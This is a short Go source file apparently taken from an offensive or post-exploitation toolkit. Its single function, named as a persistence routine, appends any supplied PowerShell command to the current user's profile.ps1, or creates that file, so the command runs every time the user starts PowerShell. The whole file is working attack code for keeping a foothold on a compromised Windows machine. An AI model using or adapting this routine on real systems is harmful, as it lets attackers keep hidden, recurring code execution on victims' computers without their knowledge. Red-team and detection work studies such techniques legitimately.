package powershellprofile

import (
	"errors"
	"fmt"
	"log"
	"os"
)

func PowershellProfilePersistence(powershellCommand string) (string, error) {
	c := os.Getenv("HOMEDRIVE")
	p := os.Getenv("HOMEPATH")
	path := fmt.Sprintf("%s%s\\Documents\\WindowsPowerShell\\profile.ps1", c, p)
	_, err := os.Stat(path)
	if !errors.Is(err, os.ErrNotExist) {
		log.Println("Appending")
		file, err := os.OpenFile(path, os.O_APPEND|os.O_WRONLY, 0644)
		if err != nil {
			return "", err
		}
		defer file.Close()
		_, err = file.WriteString("\n\n\n")
		if err != nil {
			return "", err
		}
		wrote, err := file.WriteString(powershellCommand)
		if err != nil {
			return "", err
		}
		return fmt.Sprintf("Appended %d bytes to %s", wrote, path), nil
	}
	file, err := os.Create(path)
	if err != nil {
		return "", err
	}
	defer file.Close()
	wrote, err := file.WriteString(powershellCommand)
	if err != nil {
		return "", err
	}
	return fmt.Sprintf("Wrote %d bytes to %s", wrote, path), nil
}
